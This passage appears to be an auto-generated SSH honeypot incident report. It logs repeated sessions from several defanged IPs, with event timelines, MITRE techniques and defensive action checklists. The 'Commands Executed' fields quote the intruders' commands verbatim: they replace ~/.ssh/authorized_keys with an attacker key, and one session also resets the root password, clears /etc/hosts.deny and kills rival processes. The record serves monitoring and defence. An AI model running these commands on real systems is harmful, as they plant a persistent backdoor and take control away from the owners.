| `2026-04-15 07:36:34` | `cowrie.session.params` |
| `2026-04-15 07:36:34` | `cowrie.command.input` |
| `2026-04-15 07:36:34` | `cowrie.log.closed` |
| `2026-04-15 07:36:35` | `cowrie.session.params` |
| `2026-04-15 07:36:35` | `cowrie.command.input` |
| `2026-04-15 07:36:35` | `cowrie.session.file_download` |
| `2026-04-15 07:36:35` | `cowrie.log.closed` |
| `2026-04-15 07:36:35` | `cowrie.session.params` |
| `2026-04-15 07:36:35` | `cowrie.command.input` |
| `2026-04-15 07:36:36` | `cowrie.log.closed` |
| `2026-04-15 07:36:36` | `cowrie.session.params` |
| `2026-04-15 07:36:36` | `cowrie.command.input` |
| `2026-04-15 07:36:36` | `cowrie.log.closed` |
| `2026-04-15 07:36:36` | `cowrie.session.params` |
| `2026-04-15 07:36:36` | `cowrie.command.input` |
| `2026-04-15 07:36:36` | `cowrie.command.input` |
| `2026-04-15 07:36:36` | `cowrie.log.closed` |
| `2026-04-15 07:36:37` | `cowrie.session.params` |
| `2026-04-15 07:36:37` | `cowrie.command.input` |
| `2026-04-15 07:36:37` | `cowrie.log.closed` |
| `2026-04-15 07:36:37` | `cowrie.session.params` |
| `2026-04-15 07:36:37` | `cowrie.command.input` |
| `2026-04-15 07:36:37` | `cowrie.log.closed` |
| `2026-04-15 07:36:38` | `cowrie.session.params` |
| `2026-04-15 07:36:38` | `cowrie.command.input` |
| `2026-04-15 07:36:38` | `cowrie.log.closed` |
| `2026-04-15 07:36:38` | `cowrie.session.params` |
| `2026-04-15 07:36:38` | `cowrie.command.input` |
| `2026-04-15 07:36:38` | `cowrie.log.closed` |
| `2026-04-15 07:36:39` | `cowrie.session.params` |
| `2026-04-15 07:36:39` | `cowrie.command.input` |
| `2026-04-15 07:36:39` | `cowrie.log.closed` |
| `2026-04-15 07:36:39` | `cowrie.session.params` |
| `2026-04-15 07:36:39` | `cowrie.command.input` |
| `2026-04-15 07:36:40` | `cowrie.log.closed` |
| `2026-04-15 07:36:40` | `cowrie.session.params` |
| `2026-04-15 07:36:40` | `cowrie.command.input` |
| `2026-04-15 07:36:40` | `cowrie.log.closed` |
| `2026-04-15 07:36:40` | `cowrie.session.params` |
| `2026-04-15 07:36:40` | `cowrie.command.input` |
| `2026-04-15 07:36:40` | `cowrie.log.closed` |
| `2026-04-15 07:36:41` | `cowrie.session.params` |
| `2026-04-15 07:36:41` | `cowrie.command.input` |
| `2026-04-15 07:36:41` | `cowrie.log.closed` |
| `2026-04-15 07:36:41` | `cowrie.session.params` |
| `2026-04-15 07:36:41` | `cowrie.command.input` |
| `2026-04-15 07:36:42` | `cowrie.log.closed` |
| `2026-04-15 07:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.84[.]166` to AbuseIPDB if not already reported
- [ ] Block `14.103.84[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d282ca17466

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:36 |
| **Last Seen** | 2026-04-15 07:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:36:54` | `cowrie.session.connect` |
| `2026-04-15 07:36:54` | `cowrie.client.version` |
| `2026-04-15 07:36:54` | `cowrie.client.kex` |
| `2026-04-15 07:36:55` | `cowrie.login.success` |
| `2026-04-15 07:36:55` | `cowrie.session.params` |
| `2026-04-15 07:36:55` | `cowrie.command.input` |
| `2026-04-15 07:36:55` | `cowrie.command.failed` |
| `2026-04-15 07:36:55` | `cowrie.log.closed` |
| `2026-04-15 07:36:56` | `cowrie.session.params` |
| `2026-04-15 07:36:56` | `cowrie.command.input` |
| `2026-04-15 07:36:56` | `cowrie.session.file_download` |
| `2026-04-15 07:36:56` | `cowrie.log.closed` |
| `2026-04-15 07:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227fc7cb9b01

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:36 |
| **Last Seen** | 2026-04-15 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:36:58` | `cowrie.session.connect` |
| `2026-04-15 07:36:58` | `cowrie.client.version` |
| `2026-04-15 07:36:58` | `cowrie.client.kex` |
| `2026-04-15 07:36:59` | `cowrie.login.success` |
| `2026-04-15 07:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7406a0f997bf

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 07:37 |
| **Last Seen** | 2026-04-15 07:37 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:fC9CuTa8buoQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:37:34` | `cowrie.session.connect` |
| `2026-04-15 07:37:34` | `cowrie.client.version` |
| `2026-04-15 07:37:34` | `cowrie.client.kex` |
| `2026-04-15 07:37:35` | `cowrie.login.success` |
| `2026-04-15 07:37:35` | `cowrie.session.params` |
| `2026-04-15 07:37:35` | `cowrie.command.input` |
| `2026-04-15 07:37:35` | `cowrie.command.failed` |
| `2026-04-15 07:37:35` | `cowrie.log.closed` |
| `2026-04-15 07:37:36` | `cowrie.session.params` |
| `2026-04-15 07:37:36` | `cowrie.command.input` |
| `2026-04-15 07:37:36` | `cowrie.session.file_download` |
| `2026-04-15 07:37:36` | `cowrie.log.closed` |
| `2026-04-15 07:37:48` | `cowrie.session.params` |
| `2026-04-15 07:37:48` | `cowrie.command.input` |
| `2026-04-15 07:37:48` | `cowrie.log.closed` |
| `2026-04-15 07:37:48` | `cowrie.session.params` |
| `2026-04-15 07:37:48` | `cowrie.command.input` |
| `2026-04-15 07:37:48` | `cowrie.log.closed` |
| `2026-04-15 07:37:49` | `cowrie.session.params` |
| `2026-04-15 07:37:49` | `cowrie.command.input` |
| `2026-04-15 07:37:49` | `cowrie.session.file_download` |
| `2026-04-15 07:37:49` | `cowrie.log.closed` |
| `2026-04-15 07:37:49` | `cowrie.session.params` |
| `2026-04-15 07:37:49` | `cowrie.command.input` |
| `2026-04-15 07:37:49` | `cowrie.log.closed` |
| `2026-04-15 07:37:49` | `cowrie.session.params` |
| `2026-04-15 07:37:49` | `cowrie.command.input` |
| `2026-04-15 07:37:49` | `cowrie.log.closed` |
| `2026-04-15 07:37:50` | `cowrie.session.params` |
| `2026-04-15 07:37:50` | `cowrie.command.input` |
| `2026-04-15 07:37:50` | `cowrie.command.input` |
| `2026-04-15 07:37:50` | `cowrie.log.closed` |
| `2026-04-15 07:37:50` | `cowrie.session.params` |
| `2026-04-15 07:37:50` | `cowrie.command.input` |
| `2026-04-15 07:37:50` | `cowrie.log.closed` |
| `2026-04-15 07:37:50` | `cowrie.session.params` |
| `2026-04-15 07:37:50` | `cowrie.command.input` |
| `2026-04-15 07:37:51` | `cowrie.log.closed` |
| `2026-04-15 07:37:51` | `cowrie.session.params` |
| `2026-04-15 07:37:51` | `cowrie.command.input` |
| `2026-04-15 07:37:51` | `cowrie.log.closed` |
| `2026-04-15 07:37:51` | `cowrie.session.params` |
| `2026-04-15 07:37:51` | `cowrie.command.input` |
| `2026-04-15 07:37:51` | `cowrie.log.closed` |
| `2026-04-15 07:37:52` | `cowrie.session.params` |
| `2026-04-15 07:37:52` | `cowrie.command.input` |
| `2026-04-15 07:37:52` | `cowrie.log.closed` |
| `2026-04-15 07:37:52` | `cowrie.session.params` |
| `2026-04-15 07:37:52` | `cowrie.command.input` |
| `2026-04-15 07:37:52` | `cowrie.log.closed` |
| `2026-04-15 07:37:52` | `cowrie.session.params` |
| `2026-04-15 07:37:52` | `cowrie.command.input` |
| `2026-04-15 07:37:52` | `cowrie.log.closed` |
| `2026-04-15 07:37:53` | `cowrie.session.params` |
| `2026-04-15 07:37:53` | `cowrie.command.input` |
| `2026-04-15 07:37:53` | `cowrie.log.closed` |
| `2026-04-15 07:37:53` | `cowrie.session.params` |
| `2026-04-15 07:37:53` | `cowrie.command.input` |
| `2026-04-15 07:37:53` | `cowrie.log.closed` |
| `2026-04-15 07:37:54` | `cowrie.session.params` |
| `2026-04-15 07:37:54` | `cowrie.command.input` |
| `2026-04-15 07:37:54` | `cowrie.log.closed` |
| `2026-04-15 07:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9320f4142e22

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:38 |
| **Last Seen** | 2026-04-15 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:38:26` | `cowrie.session.connect` |
| `2026-04-15 07:38:26` | `cowrie.client.version` |
| `2026-04-15 07:38:26` | `cowrie.client.kex` |
| `2026-04-15 07:38:26` | `cowrie.login.success` |
| `2026-04-15 07:38:27` | `cowrie.session.params` |
| `2026-04-15 07:38:27` | `cowrie.command.input` |
| `2026-04-15 07:38:27` | `cowrie.command.failed` |
| `2026-04-15 07:38:27` | `cowrie.log.closed` |
| `2026-04-15 07:38:27` | `cowrie.session.params` |
| `2026-04-15 07:38:27` | `cowrie.command.input` |
| `2026-04-15 07:38:27` | `cowrie.session.file_download` |
| `2026-04-15 07:38:27` | `cowrie.log.closed` |
| `2026-04-15 07:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76fa0578e49f

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:38 |
| **Last Seen** | 2026-04-15 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:38:29` | `cowrie.session.connect` |
| `2026-04-15 07:38:29` | `cowrie.client.version` |
| `2026-04-15 07:38:29` | `cowrie.client.kex` |
| `2026-04-15 07:38:30` | `cowrie.login.success` |
| `2026-04-15 07:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fa59898441

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:40 |
| **Last Seen** | 2026-04-15 07:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:40:05` | `cowrie.session.connect` |
| `2026-04-15 07:40:05` | `cowrie.client.version` |
| `2026-04-15 07:40:05` | `cowrie.client.kex` |
| `2026-04-15 07:40:06` | `cowrie.login.success` |
| `2026-04-15 07:40:06` | `cowrie.session.params` |
| `2026-04-15 07:40:06` | `cowrie.command.input` |
| `2026-04-15 07:40:06` | `cowrie.command.failed` |
| `2026-04-15 07:40:06` | `cowrie.log.closed` |
| `2026-04-15 07:40:06` | `cowrie.session.params` |
| `2026-04-15 07:40:06` | `cowrie.command.input` |
| `2026-04-15 07:40:07` | `cowrie.session.file_download` |
| `2026-04-15 07:40:07` | `cowrie.log.closed` |
| `2026-04-15 07:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c941cc0be54e

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:40 |
| **Last Seen** | 2026-04-15 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:40:09` | `cowrie.session.connect` |
| `2026-04-15 07:40:09` | `cowrie.client.version` |
| `2026-04-15 07:40:09` | `cowrie.client.kex` |
| `2026-04-15 07:40:09` | `cowrie.login.success` |
| `2026-04-15 07:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4272436845a

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:40 |
| **Last Seen** | 2026-04-15 07:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:40:41` | `cowrie.session.connect` |
| `2026-04-15 07:40:41` | `cowrie.client.version` |
| `2026-04-15 07:40:42` | `cowrie.client.kex` |
| `2026-04-15 07:40:43` | `cowrie.login.success` |
| `2026-04-15 07:40:43` | `cowrie.session.params` |
| `2026-04-15 07:40:43` | `cowrie.command.input` |
| `2026-04-15 07:40:43` | `cowrie.command.failed` |
| `2026-04-15 07:40:43` | `cowrie.log.closed` |
| `2026-04-15 07:40:44` | `cowrie.session.params` |
| `2026-04-15 07:40:44` | `cowrie.command.input` |
| `2026-04-15 07:40:44` | `cowrie.session.file_download` |
| `2026-04-15 07:40:44` | `cowrie.log.closed` |
| `2026-04-15 07:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8fc64f48a99

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:40 |
| **Last Seen** | 2026-04-15 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:40:47` | `cowrie.session.connect` |
| `2026-04-15 07:40:47` | `cowrie.client.version` |
| `2026-04-15 07:40:47` | `cowrie.client.kex` |
| `2026-04-15 07:40:48` | `cowrie.login.success` |
| `2026-04-15 07:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610a971729c9

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:41 |
| **Last Seen** | 2026-04-15 07:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:41:35` | `cowrie.session.connect` |
| `2026-04-15 07:41:35` | `cowrie.client.version` |
| `2026-04-15 07:41:36` | `cowrie.client.kex` |
| `2026-04-15 07:41:36` | `cowrie.login.success` |
| `2026-04-15 07:41:37` | `cowrie.session.params` |
| `2026-04-15 07:41:37` | `cowrie.command.input` |
| `2026-04-15 07:41:37` | `cowrie.command.failed` |
| `2026-04-15 07:41:37` | `cowrie.log.closed` |
| `2026-04-15 07:41:37` | `cowrie.session.params` |
| `2026-04-15 07:41:37` | `cowrie.command.input` |
| `2026-04-15 07:41:37` | `cowrie.session.file_download` |
| `2026-04-15 07:41:37` | `cowrie.log.closed` |
| `2026-04-15 07:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ece872484a

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:41 |
| **Last Seen** | 2026-04-15 07:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:41:39` | `cowrie.session.connect` |
| `2026-04-15 07:41:39` | `cowrie.client.version` |
| `2026-04-15 07:41:39` | `cowrie.client.kex` |
| `2026-04-15 07:41:40` | `cowrie.login.success` |
| `2026-04-15 07:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8fcd474de2

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:43 |
| **Last Seen** | 2026-04-15 07:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:43:00` | `cowrie.session.connect` |
| `2026-04-15 07:43:00` | `cowrie.client.version` |
| `2026-04-15 07:43:00` | `cowrie.client.kex` |
| `2026-04-15 07:43:00` | `cowrie.login.success` |
| `2026-04-15 07:43:01` | `cowrie.session.params` |
| `2026-04-15 07:43:01` | `cowrie.command.input` |
| `2026-04-15 07:43:01` | `cowrie.command.failed` |
| `2026-04-15 07:43:01` | `cowrie.log.closed` |
| `2026-04-15 07:43:01` | `cowrie.session.params` |
| `2026-04-15 07:43:01` | `cowrie.command.input` |
| `2026-04-15 07:43:01` | `cowrie.session.file_download` |
| `2026-04-15 07:43:01` | `cowrie.log.closed` |
| `2026-04-15 07:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068e7a8bb89f

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:43 |
| **Last Seen** | 2026-04-15 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:43:03` | `cowrie.session.connect` |
| `2026-04-15 07:43:03` | `cowrie.client.version` |
| `2026-04-15 07:43:04` | `cowrie.client.kex` |
| `2026-04-15 07:43:04` | `cowrie.login.success` |
